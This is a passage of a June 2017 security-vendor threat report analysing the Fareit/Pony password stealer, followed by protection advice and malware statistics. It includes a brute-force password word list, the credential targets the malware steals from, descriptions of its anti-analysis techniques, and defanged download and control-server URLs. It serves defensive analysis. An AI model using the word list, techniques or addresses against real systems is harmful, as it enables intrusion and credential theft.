junior

rainbow
112233
nintendo
peanut
none
church
bubbles
robert
222222
destiny
loving
gfhjkm
mylove
jasperh
allo
123321
cocacola
helpme

nicole
guitar
billga
tes
looking
scooby
joseph
genesis
forum
emmanue
cassie
victory
passw0rd
foobar
nathan
blabla
digital
peaches

football1
11111111
power
thunder
gateway
iloveyou!
football
tigger
corvet
teangel
killer
creative
12345678
google
zxcvbnm
startrek
ashley
cheesea

sunshine
christ
000000
soccer
qwerty1
friend
summer
1234567
merlin
phpbb
12345678
jor
dan
saved
dexter
viper
winner
sparky

windows
123abc
lucky
anthony
jesus
admin
hotdog
base
ball
password
dragon
trustno1
jason
internet
batman
123456
single
apple

Figure 56: A partial Word list for brute-force attacks on local usernames.

Share this Report

McAfee Labs Threats Report, June 2017 | 55

Key Topics

Fareit can steal credentials from a
multitude of applications.

32-bit FTP
3D FTP
ALFTP
BitKinex
Blaze FTP
BulletProof FTP
ClassicFTP
Coffee Cup FTP
Core FTP
CuteFTP
Direct FTP
Easy FTP
ExpanDrive

Stealing behavior
Fareit tries to steal saved passwords from browsers. It also tries to steal stored
account information such as server names, port numbers, login IDs, and
passwords from the following FTP clients or cloud storage programs:

FFFTP
FTP++
FTP Client
FTP Commander FTP
Control
FTP Explorer
FTP Navigator
FTP Now
FTP Rush
FTP Voyager
Far FTP
FileZilla
FlashFxp

FlingFTP
Free FTP
Frigate FTP
LeapFTP
Leech FTP
NetDrive
Opus
Robo FTP
SecureFX
SmartFTP
Total Commander
TurboFTP
UltraFXP

WS_FTP
Web Site Publisher
WebDrive
WinSCP
Windows Commander
Wise-FTP

Fareit Execution Flow
Start

Initialize
• Anti-reversing routines
• Initialize API addresses
• Privileged user
account check
• Brute-force attack
on local users

Find installed
applications

Scan and steal
credentials

Enumerate all
local users

Encrypt report
and send

Download and
execute other malware

Self-delete

Share this Report

McAfee Labs Threats Report, June 2017 | 56

Key Topics

Control panel: The Pony control panel enables the attacker to view and
manage information sent by the bot.

Figure 57: The control panel has tabs to access different information and statistics collected
by the Pony Bot.

The tabs perform the following functions:
■■

Home: General information about the ongoing work of the server.

■■

List of FTP: Download or clear the lists obtained by FTP/SFTP.

■■

■■

■■

■■

Share this Report

HTTP Passwords: Download or clear the password list obtained by
HTTP.
Others: Download or clear the lists of received certificates.
Statistics: Current numbers on the data collected. (Cleaning the
FTP list resets the statistics report.)
Domains: Add a backup domain grabber for the operational test
for accessibility.

■■

Logs: See the critical-error-and-notification server.

■■

Reports: List of current passwords.

■■

Management: Server settings and account management.

■■

Help: Shows various functions provided by bot and control panel.

■■

Log Out: Exit from the admin panel.
McAfee Labs Threats Report, June 2017 | 57

Key Topics

Figures 58–60: Other operating system and new stolen password–related stats on the
control server.

The Pony control panel has administrator and user modes, allowing the Pony
botnet to be delivered as a service.
Administrator mode can do everything: delete or add new users, change
server settings (including the report encryption password), change privileges
or passwords of other users, clear lists with passwords. There can be only one
administrator.
Other users, depending on their privileges, can either view the data (user_
view_only), or browse and clean the FTP/SFTP lists, reports, and logs. Users
can also change their passwords. Users cannot see the functions available
only to the administrator.

Share this Report

McAfee Labs Threats Report, June 2017 | 58

Key Topics

Figures 61–62: Two examples of Pony control panels for sale.

Fareit report contents
Stolen credentials are contained in an encrypted report file. Each report also
contains additional information:
■■

OS: Windows version.

■■

IP: Address of the sender.

■■

■■

■■

■■

HWID: A unique user identifier that does not change. With this ID,
you can find all the reports from a specific system.
Privileges: Rights (user or admin) with which the Pony Bot process
is started.
Architecture: x86 and 32-/64-bit architecture of the CPU on which
Pony.exe was launched.
Version: Pony Bot client version.

Share this Report

McAfee Labs Threats Report, June 2017 | 59

Key Topics

Figure 63: The attacker’s view of the report file with information stolen from the infected
system. These include FTP credentials, saved passwords from browser, email passwords,
and others.

Evolution

Fareit has become more evasive
and more sophisticated over
time. It is now one of the most
powerful password stealers.

In late 2011, Microsoft detected and named the new password stealer PWS:
Win32/Fareit. We believe that Fareit was incomplete at that time and was
probably in its testing phase of development.

Evolution of Fareit, aka Pony
Fareit downloads
Medfos, Nymaim,
spreads through
spam campaign
First Fareit variant with
credential-stealing
and DDoS capability

2011

2012

Pony Loader
1.9 source
code leak

2013

Fareit starts
Bitcoin mining

BHEK spreading
Fareit with Zeus,
FakeAV

Lock screen
ransomware
uses Fareit for
credential theft

Fareit credentialstealing module
spotted with
Stegoloader

Fareit spreads
through DNS
poisoning

2014

2015

Pony Loader
2.0 source
code leak

Pony Loader 2.0
capable of Bitcoin
wallet stealing

Fareit involvement
in Grizzly Steppe
Operation

2016

2017

Fareit spreads
using W97,
PowerShell,
JavaScript, MHT

DNC attack
with Onion
Duke

Many customised
Pony Loader variants
available, up to Pony
Loader 2.2
Source: McAfee, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 60

Key Topics

Figures 64–65: Screen shots of Fareit malware, detected in 2011, showing the stolen
information from the infected endpoint.

Shortly after its discovery, Fareit V1.7 was offered for sale by its author on
many underground forums. It was loaded with powerful features that led to
quick growth.

Avoiding detection
As Fareit evolved, the malware’s author implemented many anti-disassembly
and anti-debugging techniques to prevent easy analysis of the bot.
In addition to the basic detection-avoidance mechanisms implemented by
Fareit’s author, individual owners can add packers such as ASProtect as well as
custom packers to prevent detection by antimalware signatures.
Anti-Disassembly: The following is an example of an anti-disassembly
technique that attempts to confuse a recursive traversal disassembly
algorithm, which tries to follow the program control flow and disassemble
instructions at a certain location.
In this snippet, the “jb” instruction transfers control to address 0x41062e. The
disassembler assumes this location contains code and tries to disassemble it.
An attacker sometimes places junk bytes that cannot be disassembled at this
code location, causing the disassembly to fail.
The actual control transfer in the code takes place by the “push” and “retn”
instructions at 0x00410625 and 0x0041062d, respectively.

Share this Report

McAfee Labs Threats Report, June 2017 | 61

Key Topics

Anti-Emulation: Fareit also employs anti-emulation to bypass many
antimalware heuristic detection mechanisms. This technique consumes
emulation cycles by entering large loops. The preceding loop executes until
the number of milliseconds elapsed since the computer was started when
divided by 10 does not give a remainder of 5. As the probability of getting 5 as
a remainder is small, the loop will continue for a long period, thus stalling the
execution.

Packers: We have seen samples using a unique stub generation (USG) crypter
to encrypt the Pony Bot executable and further pack it with AsProtect and
custom packers. (A custom packer can use many compilers to generate
executables. Common compilers include Visual Basic and .Net.) We have also
seen the Pony Bot executables compiled with the AutoIt script.

Figure 66: We found the USG crypter for $45 for new users and $25 per month for renewals.

Share this Report

McAfee Labs Threats Report, June 2017 | 62

Key Topics

The DNC attack
The Democratic National Committee breach in 2016 in the United States has
been attributed to a malware campaign known as Grizzly Steppe.
Grizzly Steppe targets government organizations, critical infrastructure
companies, think tanks, political organizations, and corporations around
the world. It uses tactics such as shortened URLs, spear phishing, lateral
movement, and escalating privileges to infect systems and networks.

Fareit was likely used to steal
email, FTP, and other important
credentials during the U.S.’s
Democratic National Committee
breach in 2016.

According to published reports, the Grizzly Steppe campaign ran in two
phases. In 2015, it executed a spear phishing campaign to send malicious
links redirecting to malware downloads. Then in 2016, it tricked people
into changing passwords through fake lookalike domains. Credentials and
other information (including emails) were stolen from victims’ systems and
published in the public domain.
We found Fareit hashes in the indicators of compromise list published by the
US government in its Grizzly Steppe report.

Fareit was likely used in conjunction with other techniques in the DNC attack
to steal email, FTP, and other important credentials and used them to carry
out further attacks.

Share this Report

McAfee Labs Threats Report, June 2017 | 63

Key Topics

We suspect that Fareit was also used to download APT threats such as Onion
Duke and Vawtrak onto the victims’ systems to carry out further attacks. We
found the following URLs for downloading and executing used by Fareit’s
loader component:
■■

hxxp://one2shoppee.com/system/logs/xtool.exe

■■

hxxp://insta.reduct.ru/system/logs/xtool.exe

■■

hxxp://editprod.waterfilter.in.ua/system/logs/xtool.exe

In our analysis, we found that Fareit malware believed to be specific to the
DNC attack was dropped by malicious Word documents. These files were
spread through phishing email campaigns.
The following code shows credential-stealing subroutines or modules found
in a Fareit sample likely used in the DNC attack. The number of credentialstealing modules is significantly lower in this sample than in most Fareit
samples. The attackers may have concluded that some were irrelevant for this
attack.

Figure 67: Hardcoded addresses of credential-stealing modules from a Fareit sample likely
used in the DNC attack.

Share this Report

McAfee Labs Threats Report, June 2017 | 64

Key Topics

Figure 68: Credential-stealing modules generally found in the wild.

Next called function address will be
referenced here

Share this Report

Figure 69: This code calls all the credential-stealing subroutines shown in Figure 63. This
code is not specific to the Fareit sample likely used in the DNC attack but is common in
other Fareit samples.

McAfee Labs Threats Report, June 2017 | 65

Key Topics

Network activity in the DNC attack
Let’s look at two snippets of code from a Fareit sample likely used in the
DNC attack. Each control server address is called in a loop. It checks for the
“STATUS-IMPORT-OK” string in the control server’s response. The loop will go
on to the next URL if this response is not received.

Figure 70: This subroutine found in a Fareit sample likely used in the DNC attack is responsible
for connecting to different control servers in case the current URL is unresponsive.

The Fareit malware likely used in the DNC attack references multiple control
server addresses that are not commonly observed in Fareit samples found in
the wild:
■■

hxxp://wilcarobbe.com/zapoy/gate.php

■■

hxxp://littjohnwilhap.ru/zapoy/gate.php

■■

hxxp://ritsoperrol.ru/zapoy/gate.php

Share this Report

McAfee Labs Threats Report, June 2017 | 66

Key Topics

Figure 71: This subroutine found in a Fareit sample likely used in the DNC attack can be
used to download additional malware.

The Fareit sample likely used in the DNC attack can download additional
malware from these locations:
■■

hxxp://one2shoppee.com/system/logs/xtool.exe

■■

hxxp://insta.reduct.ru/system/logs/xtool.exe

■■

hxxp://editprod.waterfilter.in.ua/system/logs/xtool.exe

Share this Report

McAfee Labs Threats Report, June 2017 | 67

Key Topics

Solution Brief

Protecting
Against Password
Stealers

Policies and procedures
You can take several steps to avoid infection by threats such as Fareit.

As we depend ever more on personal electronic devices and businesses
move valuable information to the cloud, the value of access credentials has
risen. Today, attackers use stolen passwords in the early stages of nearly all
major advanced persistent threats.
Password stealers focus on breaching network security to obtain critical
access credentials. The Fareit password stealer’s robust capabilities have
made it the most popular password-stealing malware for more than ﬁve
years. Since its discovery in 2012, it has continued to change to elude the
latest cyber-defense strategies.

■■

Initially, Fareit focused on stealing login credentials from web browsers to gain access to applications
such as online banking, email accounts, and for identity theft. Since then, Fareit has evolved into a
more aggressive information stealer that hides using mimetic tactics such as changing its ﬁle hash
with each infection. In 2016, a new generation of Fareit password-stealing malware appeared, using
an infected network asset to perform distributed denial of service attacks. Further, Fareit is now
oﬀered as a pay-per-infection service, which means that cybercriminals are now earning money to
distribute malware. The more infections they can achieve, the more they are paid.
Phishing attacks that deliver password stealers such as Fareit are among the top initial attack vectors
during the past decade.

Policies and procedures to protect against password-stealer attacks
McAfee recommends that organizations take the following steps to protect against password-stealer
attacks:
■

■

In general, password stealers are often distributed by malware, so as a standard security
principle always keep antimalware products up to date.
Malware can be downloaded by unaware users while browsing. Keep web browsers and
add-ons up to date to add an extra layer of protection.

To learn how McAfee products
can help protect against
password stealers, click here.

■■

■■

■■

■■

■■

Create strong passwords and change them regularly. The
longer and more varied a password, the stronger it is. Incorporate
numbers, uppercase and lowercase letters, and special characters.
We also recommended changing passwords two to three times
per year, and immediately after any breach. If this sounds like too
much to track, consider using a password management tool.
Use different passwords for every account or service. This
prevents access to other accounts and services even if one account
is compromised.
Employ multifactor authentication. In the event of a
compromised account, the attacker will not be able to access the
account until the next authentication factor is verified.
Do not use public computers for anything that requires a
password. Avoid using systems in coffee shops, libraries, or other
public Wi-Fi locations because those networks are susceptible to
keystroke-logging software and other types of malware.
Be extra cautious when opening email attachments. This is a
big one! Do not open any strange-looking attachments or click on
links from suspicious or unknown senders. Even if the attachment
or link is received from a friend, make sure that the email or social
network post does not look questionable before clicking on it. This
person may have already had their account compromised.
Install comprehensive security on all devices. Practice basic
security hygiene such as keeping security software up to date. This
simple step significantly reduces the chance of being infected by
Fareit or other malware.

To learn how McAfee products can help protect against password stealers,
click here.

Share this Report

McAfee Labs Threats Report, June 2017 | 68

Threats Statistics
Malware
Incidents
Web and Network Threats

Share feedback

Threats Statistics

Malware
New
Malware
New Malware
40,000,000

New malware counts rebounded
to the quarterly average we have
seen during the past four years.

35,000,000
30,000,000
25,000,000
20,000,000
15,000,000
10,000,000
5,000,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Total
Total Malware
Malware
700,000,000
600,000,000
500,000,000
400,000,000
300,000,000
200,000,000
100,000,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 70

Threats Statistics

New
Malware
NewMobile
Mobile Malware
2,500,000
2,000,000
1,500,000
1,000,000
500,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Total
Malware
TotalMobile
Mobile Malware
18,000,000
16,000,000
14,000,000
12,000,000
10,000,000
8,000,000
6,000,000
4,000,000
2,000,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 71

Threats Statistics

Regional Mobile Malware Infection Rates

(percentage
of mobile
reporting
infections)
Regional
Mobile customers
Malware Infection
Rates
22%

Mobile malware reports from
Asia doubled in Q1, contributing
to a 62.5% increase in global
infection rates. (See next chart.)
The largest contributor is
Android/SMSreg, a potentially
unwanted program detection
from India.

20%
18%
14%
12%
10%
8%
6%
4%
2%
0
Africa

Asia

Q1 2016

Australia
Q2 2016

Europe

North
America

Q3 2016

South
America

Q4 2016

Q1 2017

Source: McAfee Labs, 2017.

Global Mobile Malware Infection Rates

(percentage
ofMobile
mobileMalware
customers
reporting
infections)
Global
Infection
Rates
14%
12%
10%
8%
6%
4%
2%
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 72

Threats Statistics

New
OSMalware
Malware
NewMac
Mac OS
350,000

During the past three quarters,
new Mac OS malware has been
boosted by a glut of adware.

300,000
250,000
200,000
150,000
100,000
50,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Total
OSMalware
Malware
NewMac
Mac OS
800,000
700,000
600,000
500,000
400,000
300,000
200,000
100,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 73

Threats Statistics

New
NewRansomware
Ransomware
1,400,000

Ransomware rose especially due
to increased numbers of Congur
ransomware attacks on Android
OS devices.

1,200,000
1,000,000
800,000
600,000
400,000
200,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Total
Ransomware
TotalNew
New Ransomware
10,000,000
9,000,000
8,000,000
7,000,000
6,000,000
5,000,000
4,000,000
3,000,000
2,000,000
1,000,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 74

Threats Statistics

New
SignedBinaries
Binaries
NewMalicious
Malicious Signed
1,400,000
1,200,000
1,000,000
800,000
600,000
400,000
200,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Total
SignedBinaries
Binaries
TotalMalicious
Malicious Signed
22,000,000
20,000,000
18,000,000
16,000,000
14,000,000
12,000,000
10,000,000
8,000,000
6,000,000
4,000,000
2,000,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 75

Threats Statistics

New
Malware
NewMacro
Macro Malware
225,000
200,000
175,000
150,000
125,000
100,000
75,000
50,000
25,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Total
Malware
TotalMacro
Macro Malware
1,050,000
900,000
750,000
600,000
450,000
300,000
150,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 76

Threats Statistics

Incidents
Publicly Disclosed Security Incidents by Region
(number
of publicly
incidents)
Known
Publicdisclosed
Incidentssecurity
by Region

300
250
200
150
100
50
0
Q1

Q2

Europe

Americas

Africa

Multiple

Q3

2016

Q4

Asia

Q1
2017

Oceana

Source: McAfee Labs, 2017.

Top 10 Targeted Sectors in 2016–2017

(number
ofTargeted
publicly disclosed
incidents)
Top 10
Sectors insecurity
2016–2017
180
160
140
120
100
80
60
40
20

Retail

Finance

Political

Multiple

Online Services

Education

Health

Software Development

Share this Report

Single Individuals

Public

0

Source: McAfee Labs, 2017.

McAfee Labs Threats Report, June 2017 | 77

Threats Statistics

Top 10 Sectors Targeted by Region in Q1 2017
(number
incidents)
Topof
10publicly
Sectorsdisclosed
Targetedsecurity
by Region

210
180
150
120
90
60
30
0
Europe

Americas

Asia

Multiple

Health

Public

Education

Finance

Technology

Entertainment

Hospitality

Online Services

Manufacturing

Nonprofit

Source: McAfee Labs, 2017.

Top 10 Attack Vectors in 2016–2017

(number
of publicly
disclosed
incidents)
Top 10
Attack Vectors
in security
2016–2017
450
400
350
300
250
200
150
100
50

Share this Report

Vulnerability

W-2 Scam

Leak

Defacement

Malware

SQL Injection

Targeted

DDoS

Account Hijacking

Unknown

0

Source: McAfee Labs, 2017.

McAfee Labs Threats Report, June 2017 | 78

Threats Statistics

Web and Network Threats
New
URLs
New Suspect
Suspect URLs
30,000,000
25,000,000
20,000,000
15,000,000
10,000,000
5,000,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

New
URLs
New Phishing
Phishing URLs
1,400,000
1,200,000
1,000,000
800,000
600,000
400,000
200,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 79

Threats Statistics

New
URLs
New Spam
Spam URLs
2,250,000
2,000,000
1,750,000
1,500,000
1,250,000
1,000,000
750,000
500,000
250,000
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee Labs, 2017.

Spam Botnet
by Volume
Q1 2017
SpamPrevalence
Botnet Prevalence
byinVolume
1%

In April, the mastermind
behind the Kelihos botnet was
arrested in Spain. Kelihos was
responsible over many years for
millions of spam messages that
carried banking malware and
ransomware. The US Department
of Justice acknowledged
international cooperation
between United States and
foreign authorities, the Shadow
Server Foundation, and industry
vendors.

5%

4%
Gamut

11%

Cutwail
Necurs

54%

11%

KelihosC
Orangeleeches
Lethic

14%
Others

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 80

Threats Statistics

Top Malware
Connecting
toServers
Controlin
Servers
Top Malware
Connecting
to Control
Q1 2017

9%
8%
Mirai
Wapomi
Others

83%

Source: McAfee Labs, 2017.

Top Countries Hosting Botnet Control Servers
Top Countries Hosting Botnet Control Servers in Q1 2017
United States
Germany
China

24%
39%

South Korea
Netherlands

2%

Russia

3%
3%

Japan

4%

United Kingdom

5%
5%

5%

10%

Hong Kong
Others
Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 81

Threats Statistics

Top Network
Top Network
Attacks inAttacks
Q1 2017

12%

Worm

24%
6%

Denial of Service
Browser

7%

Brute Force

8%

SSL

20%
23%

Malware
Others

Source: McAfee Labs, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 82

About McAfee
Feedback. To help guide our
future work, we’re interested in
your feedback. If you would like
to share your views, please click
here to complete a quick, fiveminute Threats Report survey.

McAfee is one of the world’s leading independent cybersecurity companies.
Inspired by the power of working together, McAfee creates business
and consumer solutions that make the world a safer place. By building
solutions that work with other companies’ products, McAfee helps
businesses orchestrate cyber environments that are truly integrated, where
protection, detection and correction of threats happen simultaneously and
collaboratively. By protecting consumers across all their devices, McAfee
secures their digital lifestyle at home and away. By working with other security
players, McAfee is leading the effort to unite against cybercriminals for the
benefit of all.

Follow McAfee Labs

www.mcafee.com

McAfee
2821 Mission College Boulevard
Santa Clara, CA 95054
888 847 8766
www.mcafee.com

The information in this document is provided only for educational purposes and for the convenience of McAfee
customers. The information contained herein is subject to change without notice, and is provided “as is,”
without guarantee or warranty as to the accuracy or applicability of the information to any specific situation
or circumstance. McAfee and the McAfee logo are trademarks or registered trademarks of McAfee, LLC or its
subsidiaries in the US and other countries. Other marks and brands may be claimed as the property of others.
Copyright © 2017 McAfee, LLC
3142_0517_rp-threat-report-jun-2017
June 2017